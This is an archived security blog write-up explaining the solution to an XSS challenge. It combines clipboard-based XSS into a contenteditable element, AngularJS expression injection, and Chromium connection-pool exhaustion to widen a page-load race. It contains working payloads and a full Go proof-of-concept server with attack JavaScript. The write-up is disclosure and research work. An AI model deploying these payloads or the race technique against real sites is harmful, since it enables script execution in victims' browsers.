---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-10-29_dom-based-race-condition-racing-in-the-browser-for-fun.md
original_filename: 2023-10-29_dom-based-race-condition-racing-in-the-browser-for-fun.md
title: 'DOM-based race condition: racing in the browser for fun'
category: documents
detected_topics:
- supply-chain
- sso
- xss
- command-injection
- automation-abuse
- race-condition
tags:
- imported
- documents
- supply-chain
- sso
- xss
- command-injection
- automation-abuse
- race-condition
language: en
raw_sha256: 23636f90d2f14dad3182b8993a831bc05273e37874e3b74384ee0f4401f7d98f
text_sha256: 3d119c9e162e98f521005ebe65f7b45817f452dc8c2f4203b6252eaa13260c96
ingested_at: '2026-06-28T07:32:27Z'
sensitivity: unknown
redactions_applied: false
---

# DOM-based race condition: racing in the browser for fun

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-10-29_dom-based-race-condition-racing-in-the-browser-for-fun.md
- Source Type: markdown
- Detected Topics: supply-chain, sso, xss, command-injection, automation-abuse, race-condition
- Ingested At: 2026-06-28T07:32:27Z
- Redactions Applied: False
- Raw SHA256: `23636f90d2f14dad3182b8993a831bc05273e37874e3b74384ee0f4401f7d98f`
- Text SHA256: `3d119c9e162e98f521005ebe65f7b45817f452dc8c2f4203b6252eaa13260c96`


## Content

---
title: "DOM-based race condition: racing in the browser for fun"
page_title: "DOM-based race condition: racing in the browser for fun - RyotaK's Blog"
url: "https://blog.ryotak.net/post/dom-based-race-condition/"
final_url: "https://blog.ryotak.net/post/dom-based-race-condition/"
authors: ["RyotaK (@ryotkak)"]
bugs: ["Race condition", "XSS", "XSLeaks"]
publication_date: "2023-10-29"
added_date: "2024-01-18"
source: "pentester.land/writeups.json"
original_index: 693
---

## [DOM-based race condition: racing in the browser for fun](https://blog.ryotak.net/post/dom-based-race-condition/)

 __2023-10-29 __2099 字 __タグはありません

## Disclaimer

All projects mentioned in this blog post have been contacted, and I confirmed that the behavior described in this article is either working as intended, already fixed, or will not be fixed.

## TL;DR

The browser loads elements in the HTML from top to bottom, and some JavaScript libraries retrieve data or attributes from the DOM after the page has been completely loaded.  
Because of how the `contenteditable` attribute works, we might have a race condition in applications that use those JavaScript libraries with the `contenteditable` element, depending on how the page loads the library.  
In this article, I’ll explain how it’s possible and how to increase the timing window of this race.

## The challenge

On the October 6th, I posted the following XSS challenge.  

> I made a small XSS Challenge!  
>  
> Can you pop an alert on this page? (The intended solution should be hard!)  
>  
> Rules are included on the challenge page: <https://t.co/e4CZByywdT> [pic.twitter.com/Xfdbij0iPC](https://t.co/Xfdbij0iPC)
> 
> — RyotaK (@ryotkak) [October 6, 2023](https://twitter.com/ryotkak/status/1710291366654181749?ref_src=twsrc%5Etfw)

The intended solution for this challenge looks like this.  

## Clipboard-based XSS (aka Copy & Paste XSS)

To explain the intended solution, I must explain the clipboard-based XSS.  
In 2020, [Michał Bentkowski](https://twitter.com/SecurityMB) published [excellent research](https://research.securitum.com/the-curious-case-of-copy-paste/) regarding the XSS that the clipboard involves.  
This research is focused on exploitation against the `contenteditable` attribute and the `paste` event handlers.

Basically, the following snippet is vulnerable to the clipboard-based XSS:
  
  
  <input placeholder="Paste here" id="pasted"/>
  <script>
  document.addEventListener('paste', event => {
  const data = event.clipboardData.getData('text/html');
  pasted.innerHTML = data;
  });
  </script>
  

It can be exploited using the following page:
  
  
  <button onclick="copy()">Click</button>
  <script>
  document.addEventListener('copy', event => {
  event.preventDefault();
  event.clipboardData.setData('text/html', '<img src onerror=alert(1)>');
  alert('Please paste the copied contents into the vulnerable page');
  });
  function copy() {
  document.execCommand('copy');
  }
  </script>
  

He also reported that the following page can be vulnerable to the clipboard-based XSS, using the vulnerability in the sanitizer of the browser:
  
  
  <div contenteditable></div>
  

This was possible because:

  1. The browser allows the `text/html` to be pasted as the HTML instead of the plain text.1
  2. To prevent the XSS, the browser sanitized the contents of the `text/html` data.
  3. However, there were flaws in this sanitizer, allowing him to bypass it and achieve XSS or various impacts.

When writing this article, there are no known ways to bypass this sanitizer, and using the `contenteditable` element alone wouldn’t cause the XSS.

However, when sanitizing the pasted contents, Chromium uses the deny-list approach to prevent XSS instead of the allow-list approach, meaning that any attributes that don’t cause XSS are allowed, including custom attributes supported by the library.2

[`third_party/blink/renderer/core/dom/element.cc` line 2545-2550](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/dom/element.cc;l=2545-2550;drc=f5bdc89c7395ed24f1b8d196a3bdd6232d5bf771)
  
  
  bool Element::IsScriptingAttribute(const Attribute& attribute) const {
  return IsEventHandlerAttribute(attribute) ||
  IsJavaScriptURLAttribute(attribute) ||
  IsHTMLContentAttribute(attribute) ||
  IsSVGAnimationAttributeSettingJavaScriptURL(attribute);
  }
  

This behavior can be used to exploit libraries that assume the contents of DOM to be trusted.  
For example, projects such as rails-ujs or Kanboard could be exploited by pasting `data-*` attributes into the `contenteditable` element. ([CVE-2023-23913](https://discuss.rubyonrails.org/t/cve-2023-23913-dom-based-cross-site-scripting-in-rails-ujs-for-contenteditable-html-elements/82468), [CVE-2023-32685](https://github.com/kanboard/kanboard/security/advisories/GHSA-hjmw-gm82-r4gv))

## ng-* attributes

Let’s get back to the challenge.  
At this point, you may have noticed that AngularJS uses `ng-*` attributes to control its behavior.

For example, when opened, the following snippet will execute `alert(1)`.3
  
  
  <html ng-app>
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>
  <div ng-init="constructor.constructor('alert(1)')()"></div>
  </html>
  

So, you may think that by pasting the `ng-*` attributes into the challenge page, we can pop an alert.  
But, this is not the case for AngularJS.

## Target of event listeners

To make the difference obvious, I’ll explain the vulnerability in rails-ujs ([CVE-2023-23913](https://discuss.rubyonrails.org/t/cve-2023-23913-dom-based-cross-site-scripting-in-rails-ujs-for-contenteditable-html-elements/82468)). This vulnerability also depends on the existence of the `contenteditable` element and can be exploited by tricking the victim pasting the malicious data into the `contenteditable` element.

In rails-ujs, they used the `document.addEventListener("click"...` to handle clicks instead of adding event listeners to each element upon loading the page.

[`actionview/app/javascript/rails-ujs/utils/event.js` line 71-80](https://github.com/rails/rails/blob/9caf1d77ee1644e8fc680195ff71a6d277213cf9/actionview/app/javascript/rails-ujs/utils/event.js#L71-L80)
  
  
  const delegate = (element, selector, eventType, handler) => element.addEventListener(eventType, function(e) {
  [...]
  })
  

[`actionview/app/javascript/rails-ujs/index.js` line 106-107](https://github.com/rails/rails/blob/9caf1d77ee1644e8fc680195ff71a6d277213cf9/actionview/app/javascript/rails-ujs/index.js#L106-L107)
  
  
  delegate(document, linkClickSelector, "click", handleRemote)
  delegate(document, linkClickSelector, "click", handleMethod)
  

By using `document.addEventListener`, this event listener can receive events from any elements in the page, including one added after the rails-ujs is loaded.

So, CVE-2023-23913 could be exploited by simply tricking the victim to paste the malicious data to the `contenteditable` element after the page is loaded.

However, AngularJS adds the event listener to each element with `ng-*` attributes after the `DOMContentLoaded` event is fired.

[`src/ng/directive/ngEventDirs.js` line 59-89](https://github.com/angular/angular.js/blob/47bf11ee94664367a26ed8c91b9b586d3dd420f5/src/ng/directive/ngEventDirs.js#L59-L89)
  
  
  function createEventDirective($parse, $rootScope, $exceptionHandler, directiveName, eventName, forceAsync) {
  return {
  restrict: 'A',
  compile: function($element, attr) {
  [...]
  var fn = $parse(attr[directiveName]);
  return function ngEventHandler(scope, element) {
  element.on(eventName, function(event) {
  [...]
  });
  };
  }
  };
  }
  
  
  
  on: function jqLiteOn(element, type, fn, unsupported) {
  [...]
  var addHandler = function(type, specialHandlerWrapper, noEventListener) {
  var eventFns = events[type];
  
  if (!eventFns) {
  eventFns = events[type] = [];
  eventFns.specialHandlerWrapper = specialHandlerWrapper;
  if (type !== '$destroy' && !noEventListener) {
  element.addEventListener(type, handle);
  }
  }
  
  eventFns.push(fn);
  };
  [...]
  },
  

This means that simply pasting the following payload into the challenge page doesn’t work.
  
  
  <div ng-app><div ng-click="constructor.constructor('alert(1)')()">Click me</div></div>
  

## HTML loading order

Before going further, I must explain how the browser loads an HTML document.

The browser normally loads the HTML document from top to bottom.4  
For example:
  
  
  <html>
  <div id="test"></div>
  <script>
  document.getElementById("test").innerHTML = "<h1>Hello world!</h1>";
  </script>
  </html>
  

Assuming the HTML above is passed to the browser, the browser loads `<div>` first, then evaluates the JavaScript in the `<script>` tag later.

![The code snippet with an arrow from the top to the bottom](/img/client-side-race-condition-top-to-bottom-arrow.png)

So, if we reverse the order of `<div>` and `<script>`, the following error occurs:
  
  
  Uncaught TypeError: Cannot set properties of null (setting 'innerHTML')
  at [first line of the JavaScript]
  

This is because of the ordering of loading; when the `<script>` tag is loaded, and the JavaScript is evaluated, the `<div id="test">` element is not loaded yet.  
So, `document.getElementById("test")` returns `null`, and access to the `innerHTML` property fails.

![The code snippet to show which area is loaded](/img/client-side-race-condition-loaded-areas.png)

## Racing with the AngularJS

Back to the challenge, we have the following HTML:
  
  
  <div contenteditable>
  <h1>Solvers:</h1>
  [...]
  </div>
  <script src="https://angular-no-http3.ryotak.net/angular.min.js"></script>
  

As AngularJS evaluates `ng-*` attributes and other expressions once loaded, we must insert an element with the XSS payload before the AngularJS is loaded.

Since the script tag is placed below the `contenteditable` element, AngularJS is loaded after the `contenteditable` element is rendered.  
So, there is approximately a 30 ms delay after the `contenteditable` element is rendered but before the AngularJS is fully loaded.

![Order of loading process](/img/client-side-race-condition-page-loading.png)

This race window is too tiny to exploit, but we have to trick the victim into pasting within this time window.

## The intended solution

30ms is enough when exploiting a race condition where an attacker can repeatedly attempt the exploit. Still, this time, we need to trick the victim into pasting the malicious data into the `contenteditable` element.  
Since it’s hard to trick the victim into pasting the contents within this time window, we need to extend it for the race.

After the previous graph’s `Parse HTML` section, the browser must fetch the AngularJS from the remote host if it’s not cached already.

![Order of loading process with Fetch AngularJS step added](/img/client-side-race-condition-page-loading-with-fetch.png)

Luckily, there is a technique to delay requests by exhausting the connection pool.  
XS-Leaks Wiki has [a good explanation about this technique](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/), so I’ll explain the summary of it here.

In Chromium, there are hard limits to the amount of connections that can be established simultaneously.  
For TCP, it is limited to 256 connections, as shown in the snippet below.5

[`net/socket/client_socket_pool_manager.cc` line 32-36](https://source.chromium.org/chromium/chromium/src/+/main:net/socket/client_socket_pool_manager.cc;l=32-36;drc=a7593fca5ff13931eb14c3c91087cc20cf367e7c)
  
  
  // Limit of sockets of each socket pool.
  int g_max_sockets_per_pool[] = {
  256,  // NORMAL_SOCKET_POOL
  256  // WEBSOCKET_SOCKET_POOL
  };
  

As the connection pool is shared across all hosts, if we open 256 connections that won’t be disconnected (e.g., by not sending the response), no further requests can be established, and the browser will wait until one of these connections is closed.

![A graph that shows the exhausted connection pool, and the browser can’t process the request from the queue](/img/client-side-race-condition-connection-pool-1.png)

This is useful to pause the loading of the AngularJS and extend the race timing window, but we still need to open the connection to the host of the challenge page. Otherwise, the challenge page won’t load, and the `contenteditable` element won’t be rendered.  
To deal with this, we can cancel the one connection after exhausting the connection pool and opening the challenge page, then quickly open another connection.

By doing so, the connection pool works as the following:

  1. After exhausting the connection pool, no further connections can be established. So, the challenge page will be kept from loading.  
![A graph that shows the behavior of step 1](/img/client-side-race-condition-connection-pool-2.png)
  2. Several seconds after opening the challenge page, we cancel one connection (①) and quickly open another connection (③). At this point, the connection to the challenge page is established (②), but the browser still needs to fetch and parse the HTML.  
![A graph that shows the behavior of step 2](/img/client-side-race-condition-connection-pool-3.png)
  3. Once the challenge page is fetched and parsed, the browser queues the connection to the host of the AngularJS file (②) and finishes the connection to the challenge page. (①) ![A graph that shows the behavior of step 3](/img/client-side-race-condition-connection-pool-4.png)
  4. Because we queued another connection in the previous step, the connection pool is exhausted again, and the AngularJS file will not be fetched.  
![A graph that shows the behavior of step 4](/img/client-side-race-condition-connection-pool-5.png)
  5. At this point, the `contenteditable` element is already rendered, so the victim can paste the malicious data without rushing.
  6. After several seconds, we cancel the connection opened in step 2 (①). By doing so, the browser can open the connection to the host of the AngularJS file (②) and evaluate the contents. Since the victim pasted the malicious data into the `contenteditable` element before AngularJS is loaded, it will evaluate the pasted expressions, and `alert(document.domain)` will be executed.  
![A graph that shows the behavior of step 6](/img/client-side-race-condition-connection-pool-6.png)

By putting it all together, this challenge can be solved by using the following code:6
  
  
  package main
  
  import (
  "fmt"
  "log"
  "net/http"
  "strconv"
  "time"
  )
  
  const(
  SERVER_IP = ""
  )
  
  func attack(w http.ResponseWriter, r *http.Request) {
  w.Header().Set("Content-Type", "text/html")
  fmt.Fprintf(w, `
  <script>
  async function fill_sockets(amount) {
  return new Promise((resolve, reject) => {
  let count = 0;
  const intervalId = setInterval(() => {
  if(count >= amount) {
  clearInterval(intervalId);
  resolve();
  return;
  }
  fetch('http://%s:' + (28000 + count) + '/sleep', {mode: "no-cors", cache: "no-store"});
  count++;
  }, 5);
  });
  }
  
  async function swap_connections(func, delay) {
  let timer = new AbortController();
  setTimeout(() => {
  timer.abort();
  timer = new AbortController();
  setTimeout(() => timer.abort(), delay*1000);
  fetch('http://%[1]s:28255/sleep', {mode: "no-cors", cache: "no-store", signal: timer.signal});
  }, 1000);
  fetch('http://%[1]s:28255/sleep', {mode: "no-cors", cache: "no-store", signal: timer.signal});
  func();
  }
  
  async function attack() {
  document.execCommand("copy");
  document.write("Filling the connection pool...<br>");
  await fill_sockets(255);
  document.write("Opening the victim page...<br>");
  swap_connections(() => {
  window.open('https://ryotak-challenges.github.io/xss-chall-1/', '_blank');
  }, 10);
  }
  
  document.addEventListener('copy', (e) => {
  e.preventDefault();
  e.clipboardData.setData('text/html', '<br><div data-ng-app>{{constructor.constructor("alert(document.domain)")();}}</div>');
  document.write("Copied the payload<br>");
  });
  </script>
  <button onclick=attack()>Attack</button>`, SERVER_IP)
  }
  
  func sleep(w http.ResponseWriter, r *http.Request) {
  time.Sleep(24 * time.Hour * 365)
  }
  
  func handleRequests() {
  http.HandleFunc("/", attack)
  http.HandleFunc("/sleep", sleep)
  
  for i := 1; i <= 256; i++ {
  go http.ListenAndServe(":"+strconv.Itoa(28000+i), nil)
  }
  log.Fatal(http.ListenAndServe(":28000", nil))
  }
  
  func main() {
  handleRequests()
  }
  

This technique is not limited to AngularJS; instead, it can be applied to any JavaScript library with the following conditions:

  1. The library retrieves data from the DOM after loading the page.
  2. The library doesn’t ignore elements under the `contenteditable` element.
  3. The user of the library uses the `contenteditable` element and loads the library afterward.

Also, It’s important to note that some vendors consider it the responsibility of the developers using libraries not to use the libraries with the `contenteditable` element.

## Appendix: Unintended Solutions

When releasing the challenge, I thought it was impossible to exploit this tiny race window without expanding it by using the technique above, or at least impossible to exploit it manually. Still, exploiting it was possible if you tried hard enough.

![Order of loading process](/img/client-side-race-condition-page-loading.png)

[@LiveOverflow](https://twitter.com/LiveOverflow) and [@stueotue](https://twitter.com/stueotue) found a way to exploit this tiny race window:

[@LiveOverflow](https://twitter.com/LiveOverflow) sent a solution that repeats pasting, sometimes winning this race.  

And [@stueotue](https://twitter.com/stueotue) sent a solution that uses drag and drop, inspired by [the Renwa’s write-up](https://medium.com/@renwa/the-underrated-bugs-clickjacking-css-injection-drag-drop-xss-cookie-bomb-login-logout-csrf-84307a98fffa). It also sometimes wins the race if the timing is matched.  

Both solutions are excellent, and I’m really impressed by their creativity.  
This challenge was the first XSS challenge that I posted on my account, so it was a good lesson for me not to underestimate the creativity of the community ;)

* * *

  1. The pasted data is inserted into the DOM, unlike having the value in the `value` property like the `<input>` tag. For example, pasting `<a href="https://example.com">Test</a>` into the `contenteditable` element as `text/html` will create the `<a>` tag with `https://example.com` as the `href` attribute. ↩︎

  2. It’s interesting that Firefox seems to be using an allow-list approach when sanitizing the contents. I think there might be a way to bypass the sanitizer of Chromium. ↩︎

  3. If you want to know why `constructor.constructor('alert(1)')()` is used instead of the usual `alert(1)`, please read this article: <https://portswigger.net/research/dom-based-angularjs-sandbox-escapes> ↩︎

  4. There are some exceptions, such as the `defer` attribute of the `<script>` tag, but I won’t explain them in this article. ↩︎

  5. According to XS-Leaks Wiki, UDP is limited to 6000 connections, so if HTTP/3 is enabled, you may need to open many more connections to exhaust the connection pool. ↩︎

  6. To prevent [connection reuse of HTTP/2](https://datatracker.ietf.org/doc/html/rfc9113#name-connection-reuse), this PoC uses 256 different ports instead of sending requests to the same port. (This code is a bit dirty, but it works! … at least on my machine.) ↩︎
